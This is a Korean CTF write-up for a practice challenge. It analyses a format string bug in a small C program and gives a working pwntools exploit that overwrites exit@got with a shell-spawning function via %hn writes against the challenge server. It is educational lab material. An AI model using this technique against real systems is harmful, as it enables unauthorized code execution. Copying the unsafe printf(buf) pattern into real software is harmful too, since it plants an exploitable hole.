```c
// Name: basic_exploitation_002.c

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell() {
    system("/bin/sh");
}

int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();

    read(0, buf, 0x80);
    printf(buf);

    exit(0);
}
```

```bash
$ checksec ./basic_exploitation_002
[*] './basic_exploitation_002'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

# 코드 분석

* `basic_exploitation_002.c:31-32` : `read` 함수를 통해 얻은 문자열 `buf`를 곧바로 `printf` 함수의 인자로 입력하므로 format string bug를 활용하면 임의주소 읽기, 쓰기가 가능하다.
* `basic_exploitation_002.c:34` : `exit(0)`을 호출하고 있으므로 `exit_got`를 `get_shell`의 주소로 overwrite하면 `get_shell`을 호출하게 할 수 있다.

# 공격

Format string bug를 활용하여 공격을 진행해야 함은 자명하므로 offset을 구하기 위해 주어진 바이너리 파일을 실행한 후, 터미널에 `"AAAA %p %p %p %p"`를 입력하자.

```bash
$ ./basic_exploitation_002 
AAAA %p %p %p %p
AAAA 0x41414141 0x20702520 0x25207025 0x70252070
...
```

위 출력 결과로부터, 입력한 문자열의 첫 4글자가 첫 번째 인자에 해당함을 알 수 있다.
따라서 첫 4바이트에 `exit@got`를 쓰고, `"%n"` format string을 활용하여 `exit@got`에 `get_shell`의 주소를 쓰게 하면 shell을 탈취할 수 있으리라는 것을 알 수 있다.

이제 gdb를 활용하여 `get_shell`의 주소를 얻어보면 다음과 같음을 알 수 있다.

```bash
pwndbg> info function
...
Non-debugging symbols:
...
0x08048609  get_shell
...
```

따라서 `"%n"` 이전까지 출력된 문자열의 길이가 `0x8048609` 바이트여야 함을 알 수 있다.
이는 10진법으로 표기하면 `134514185`로, 이 정도 길이의 문자열은 출력하는 데에 걸리는 시간만 해도 `initialize` 함수에서 설정한 30초의 제한시간이 초과되어버릴 것이다.
따라서 약간의 꼼수를 활용할 필요가 있다.
Format string에는 4바이트를 읽는 `"%n"` 외에도 2바이트를 읽는 `"%hn"`, 1바이트를 읽는 `"%hhn"`이 존재한다.
이중 `"%hn"`을 활용하면, `exit@got`의 하위 2바이트에 `0x8609`, `exit@got`의 상위 2바이트에 `0x804`를 쓸 수 있을 것이다.
이제 이 전략을 가지고 익스플로잇 코드를 작성하면 flag를 얻을 수 있다.

```python
# Name: basic_exploitation_002.py

from pwn import *

def slog(name,addr): success(f'{name}: {hex(addr)}')

HOST = 'host3.dreamhack.games'
PORT = 19985

p = remote(HOST,PORT)
e = ELF('./basic_exploitation_002')

exit = e.got['exit']

payload = p32(exit)
payload += p32(exit+2)
payload += '%{}c'.format(0x8609 - 8).encode()
payload += b'%1$hn'
payload += '%{}c'.format(0x804 - 0x8609 + 0x10000).encode()
payload += b'%2$hn'

p.send(payload)
p.interactive()
```